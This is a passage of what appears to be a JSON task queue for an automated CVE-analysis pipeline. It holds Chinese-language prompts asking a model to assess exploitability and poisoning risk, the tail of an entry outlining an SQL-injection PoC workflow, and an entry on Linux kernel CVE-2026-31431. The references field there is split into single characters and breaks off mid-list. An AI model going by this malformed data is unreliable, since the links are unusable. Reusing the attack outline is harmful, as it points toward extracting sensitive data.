`payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 2,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1782359008.3463035,
+    "last_attempt": 1782359215.3488746,
+    "next_attempt": 1782359233.0715113,
+    "metadata": {},
+    "task_id": "task_CVE-2026-45585_1782359008",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-31431",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-31431\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"In the Linux kernel, the following vulnerability has been resolved:\\n\\ncrypto: algif_aead - Revert to operating out-of-place\\n\\nThis mostly reverts commit 72548b093ee3 except for the copying of\\nthe associated data.\\n\\nThere is no benefit in operating in-place in algif_aead since the\\nsource and destination come from different mappings.  Get rid of\\nall the complexity added for in-place operation and just copy the\\nAD directly.\", \"\\u6807\\u9898: Linux Kernel CopyFail\\u672c\\u5730\\u6743\\u9650\\u63d0\\u5347\\u6f0f\\u6d1e\"], \"published_date\": \"2026-04-22T09:16:21.270\", \"last_modified_date\": \"2026-06-17T10:33:42.380\", \"cvss_score\": 7.8, \"severity\": \"HIGH\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"1\", \"9\", \"d\", \"4\", \"3\", \"1\", \"0\", \"5\", \"a\", \"9\", \"7\", \"b\", \"e\", \"0\", \"8\", \"1\", \"0\", \"e\", \"d\", \"b\", \"d\", \"a\", \"8\", \"7\", \"5\", \"f\", \"2\", \"c\", \"d\", \"0\", \"3\", \"f\", \"3\", \"0\", \"d\", \"c\", \"1\", \"3\", \"0\", \"c\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"3\", \"1\", \"1\", \"5\", \"a\", \"f\", \"9\", \"6\", \"4\", \"4\", \"c\", \"3\", \"4\", \"2\", \"b\", \"3\", \"5\", \"6\", \"f\", \"3\", \"f\", \"0\", \"7\", \"a\", \"4\", \"d\", \"d\", \"1\", \"c\", \"8\", \"9\", \"0\", \"5\", \"c\", \"d\", \"9\", \"a\", \"6\", \"f\", \"c\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"8\", \"9\", \"3\", \"d\", \"2\", \"2\", \"e\", \"0\", \"1\", \"3\", \"5\", \"f\", \"a\", \"3\", \"9\", \"4\", \"d\", \"b\", \"8\", \"1\", \"d\", \"f\", \"8\", \"8\", \"6\", \"9\", \"7\", \"f\", \"b\", \"a\", \"6\", \"0\", \"3\", \"2\", \"7\", \"4\", \"7\", \"6\", \"6\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"8\", \"b\", \"8\", \"8\", \"d\", \"9\", \"9\", \"3\", \"4\", \"1\", \"f\", \"1\", \"3\", \"9\", \"e\", \"2\", \"3\", \"b\", \"d\", \"e\", \"b\", \"1\", \"0\", \"2\", \"7\", \"a\", \"2\", \"a\", \"3\", \"a\", \"e\", \"1\", \"0\", \"d\", \"3\", \"4\", \"1\", \"d\", \"8\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"9\", \"6\", \"1\", \"c\", \"f\", \"a\", \"2\", \"7\", \"1\", \"a\", \"9\", \"1\", \"8\", \"a\", \"d\", \"4\", \"a\", \"e\", \"4\", \"5\", \"2\", \"4\", \"2\", \"0\", \"e\", \"7\", \"c\", \"3\", \"0\", \"3\", \"1\", \"4\", \"9\", \"0\", \"0\", \"2\", \"8\", \"7\", \"5\", \"b\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"a\", \"6\", \"6\", \"4\", \"b\", \"f\", \"3\", \"d\", \"6\", \"0\", \"3\", \"d\", \"c\", \"3\", \"b\", \"d\", \"c\", \"f\", \"9\", \"a\", \"e\", \"4\", \"7\", \"c\", \"c\", \"2\", \"1\", \"e\", \"0\", \"d\", \"a\", \"e\", \"c\", \"7\", \"0\", \"6\", \"d\", \"7\", \"a\", \"5\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"c\", \"e\", \"4\", \"2\", \"e\", \"e\", \"4\", \"2\", \"3\", \"e\", \"5\", \"8\", \"d\", \"f\", \"f\", \"a\", \"5\", \"e\", \"c\", \"0\", \"3\", \"5\", \"2\", \"4\", \"0\", \"5\", \"4\", \"c\", \"9\", \"d\", \"8\", \"b\", \"f\", \"d\", \"4\", \"f\", \"6\", \"2\", \"3\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"f\", \"a\", \"f\", \"e\", \"0\", \"f\", \"a\", \"2\", \"9\", \"9\", \"5\", \"a\", \"0\", \"f\", \"7\", \"0\", \"7\", \"3\", \"c\", \"1\", \"c\", \"3\", \"5\", \"8\", \"d\", \"7\", \"d\", \"3\", \"1\", \"4\", \"5\", \"b\", \"c\", \"c\", \"9\", \"a\", \"e\", \"d\", \"d\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"2\", \"9\", \"/\", \"2\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"2\", \"9\", \"/\", \"2\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"2\", \"9\", \"/\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"1\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"7\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"1\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"2\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"4\", \"/\", \"3\", \"0\", \"/\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"7\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"1\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"2\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"2\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"2\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"1\", \"/\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"7\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"1\", \"9\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"2\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"2\", \"1\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"2\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"2\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"2\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", 